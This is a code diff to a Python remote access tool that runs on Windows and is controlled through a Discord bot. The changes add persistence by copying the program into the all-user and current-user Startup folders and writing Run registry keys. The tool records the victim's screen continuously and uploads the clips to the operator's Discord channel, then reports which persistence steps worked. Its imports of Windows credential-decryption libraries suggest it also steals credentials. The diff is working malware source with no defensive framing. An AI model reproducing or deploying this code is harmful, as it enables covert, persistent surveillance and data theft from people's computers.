@@ -1,4 +1,5 @@
 import os
+import sys
 import uuid
 import json
 import shutil
@@ -14,15 +15,16 @@ import pyautogui
 import win32crypt
 import subprocess
 import numpy as np
+import winreg as reg
 from Crypto.Cipher import AES
 from datetime import datetime
 from discord.ext import commands
 from win32crypt import CryptUnprotectData
 
 # Constants
-TOKEN = "token" # Discord bot token
+TOKEN = "TOKEN" # Discord bot token
 USERNAME = os.getenv("USERNAME")  # Windows username
-GUILD_ID = "GUILD_ID"  # Replace with your actual server ID
+GUILD_ID = 000000000000000000000  # Replace with your actual server ID (Interger)
 
 # Vars for bot
 intents = discord.Intents.default()
@@ -30,6 +32,15 @@ intents.messages = True
 intents.message_content = True # Allow bot to read messages from discord channel
 intents.guilds = True # Enables interaction with discord server
 bot = commands.Bot(command_prefix='!', intents=intents) # Bot prefix
+
+#start check vars
+startup_folder_flag_C = False
+startup_folder_flag_A = False
+register_flag_C = False
+register_flag_A = False
+
+#screen recording vars
+recording_task = None
 
 # Functions
 def get_ip_address():
@@ -51,10 +62,104 @@ def get_mac_address():
     except Exception as e: # error handling for getting the mac-address
         return f"Error getting MAC address: {e}"
 
+def copy_to_start(program_to_copy):
+    global startup_folder_flag_A
+    global startup_folder_flag_C
+    try:
+        a_users = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        c_user = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        os.makedirs(a_users, exist_ok=True)
+        os.makedirs(c_user, exist_ok=True)
+        try:
+            shutil.copy2(program_to_copy, a_users)
+            print(f"Successfully copied to: {a_users}")
+            startup_folder_flag_A = True
+        except Exception as e:
+            print("All user error:", e)
+        try:
+            shutil.copy2(program_to_copy, c_user)
+            print(f"Successfully copied to: {c_user}")
+            startup_folder_flag_C = True
+        except Exception as e:
+            print("Current user error:", e)
+
+    except Exception as e:
+        print(f"There has been an error:\n{e}")
+
+def add_to_register(program_path):
+    c_user = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    program_name = os.path.basename(program_path)
+    global register_flag_A
+    global register_flag_C
+    try:
+        key = r"SOFTWARE\Microsoft\WIndows\CurrentVersion\Run"
+        try: # Current user
+            register_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
+            reg.SetValueEx(register_key, program_name, 0, reg.REG_SZ, c_user)
+            print(f"Program is added to register: {program_name}")
+            reg.CloseKey(register_key)
+            register_flag_C = True
+        except Exception as e:
+            print(e)
+        try: # all user
+            register_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key, 0, reg.KEY_SET_VALUE)
+            reg.SetValueEx(register_key, program_name, 0, reg.REG_SZ, c_user)
+            print(f"Program is added to register: {program_name}")
+            reg.CloseKey(register_key)
+            register_flag_A = True
+        except Exception as e:
+            print(e)
+            
+    except Exception as e:
+        print("Register error {e}")
+
 async def main_loop():
     while True:
         print("Hallo")
         await asyncio.sleep(5)
+
+async def record_screen(ctx, rec: bool):
+    try:
+        # Define the output file name with a timestamp
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        output_file = f"screen_recording_{timestamp}.mp4"
+
+        # Record the screen continuously in a loop until rec is False
+        fps = 12  # Frames per second
+        duration = 3  # Duration in seconds
+        frames = []
+
+        while rec:  # Loop to keep recording as long as rec is True
+            frames.clear()  # Clear the frames list for the next batch of frames
+
+            for _ in range(fps * duration):
+                if not rec:
+                    break
+
+                screenshot = pyautogui.screenshot()
+                # Convert the screenshot to a numpy array
+                frame = np.array(screenshot)
+                frames.append(frame)
+                await asyncio.sleep(1 / fps)
+
+            if frames:
+                # Save frames as a video using imageio
+                with imageio.get_writer(output_file, fps=fps) as writer:
+                    for frame in frames:
+                        writer.append_data(frame)
+
+                # Send the recorded video to Discord
+                with open(output_file, "rb") as video_file:
+                    await ctx.send(file=discord.File(video_file, output_file))
+
+                # Optional: you can clean up the recorded file after sending it
+                os.remove(output_file)
+
+    except asyncio.CancelledError:
+        # Handle the task cancellation gracefully
+        await ctx.send("Recording was cancelled.")
+    except Exception as e:
+        await ctx.send(f"❌ Error recording screen: {str(e)}")
 
 @bot.command()
 async def what(ctx):
@@ -198,8 +303,6 @@ async def getsysinfo(ctx):
     except Exception as e:
         return {"Error": f"Error getting system info: {e}"}
     
-recording_task = None  # This will store the current recording task
-
 @bot.command()
 async def screen(ctx, action: str):
     global recording_task  # To access the global task variable
@@ -233,51 +336,6 @@ async def screen(ctx, action: str):
     except Exception as e:
         await ctx.send(f"❌ Error: {str(e)}")
 
-
-async def record_screen(ctx, rec: bool):
-    try:
-        # Define the output file name with a timestamp
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        output_file = f"screen_recording_{timestamp}.mp4"
-
-        # Record the screen continuously in a loop until rec is False
-        fps = 12  # Frames per second
-        duration = 3  # Duration in seconds
-        frames = []
-
-        while rec:  # Loop to keep recording as long as rec is True
-            frames.clear()  # Clear the frames list for the next batch of frames
-
-            for _ in range(fps * duration):
-                if not rec:
-                    break
-
-                screenshot = pyautogui.screenshot()
-                # Convert the screenshot to a numpy array
-                frame = np.array(screenshot)
-                frames.append(frame)
-                await asyncio.sleep(1 / fps)
-
-            if frames:
-                # Save frames as a video using imageio
-                with imageio.get_writer(output_file, fps=fps) as writer:
-                    for frame in frames:
-                        writer.append_data(frame)
-
-                # Send the recorded video to Discord
-                with open(output_file, "rb") as video_file:
-                    await ctx.send(file=discord.File(video_file, output_file))
-
-                # Optional: you can clean up the recorded file after sending it
-                os.remove(output_file)
-
-    except asyncio.CancelledError:
-        # Handle the task cancellation gracefully
-        await ctx.send("Recording was cancelled.")
-    except Exception as e:
-        await ctx.send(f"❌ Error recording screen: {str(e)}")
-
-
 @bot.event
 async def on_ready():
     print(f'✅ Bot connected as {bot.user}')
@@ -296,7 +354,33 @@ async def on_ready():
         channel = await guild.create_text_channel(f"{USERNAME}")
         print(f"✅ Created channel: {channel.name}")
 
-    await channel.send(f"{USERNAME} is online ✅")
+    await channel.send(f"👻{USERNAME} is online ✅")
+
+    #Start up flag debug
+    if startup_folder_flag_A or startup_folder_flag_C or register_flag_A or register_flag_C:
+        # Start up
+        if startup_folder_flag_C:
+            await channel.send("✅ - Startup folder current user")
+        elif startup_folder_flag_C == False:
+            await channel.send("❌ - Startup folder current user")
+        if startup_folder_flag_A:
+            await channel.send("✅ - Startup folder All users")
+        elif startup_folder_flag_A == False:
+            await channel.send("❌ - Startup folder All users")
+        
+        # Register
+        if register_flag_C:
+            await channel.send("✅ - Reg startup current users")
+        elif register_flag_C == False:
+            await channel.send("❌ - Reg startup current users")
+        if register_flag_A:
+            await channel.send("✅ - Reg startup all users")
+        elif register_flag_A == False:
+            await channel.send("❌ - Reg startup all users")
+    else:
+        await channel.send("❌ Both startup en register failed for all users!")
+
+
     await channel.send("""``` _____                                                               _____ 
 ( ___ )                                                             ( ___ )
  |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | 
@@ -311,7 +395,7 @@ async def on_ready():
  |   |   |    | /    ~    |    __)_                                  |   | 
  |   |   |    | \    Y    |        \                                 |   | 
  |   |   |____|  \___|_  /_______  /                                 |   | 
- |   |                 \/        \/                                  |   | 
+ |   |                 \/        \/              👻                  |   | 
  |   |   ________  ___ ___ ________    ___________________           |   | 
  |   |  /  _____/ /   |   \\_____  \  /   _____\__    ___/           |   | 
  |   | /   \  ___/    ~    \/   |   \ \_____  \  |    |              |   | 
@@ -321,6 +405,7 @@ async def on_ready():
  |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| 
 (_____)                                                             (_____)```""")
     
+       
     await channel.send("```Use !what for info ✅```")
     print(f"✅ {USERNAME} sent a message.")
 
@@ -343,6 +428,9 @@ async def on_disconnect():
 
 # Run the bot securely
 if TOKEN:
+    program_path = os.path.abspath(sys.argv[0])
+    copy_to_start(program_path)
+    add_to_register(program_path)
     bot.run(TOKEN)
 else:
     print("❌ Bot token is missing! Set the DISCORD_BOT_TOKEN environment variable.")
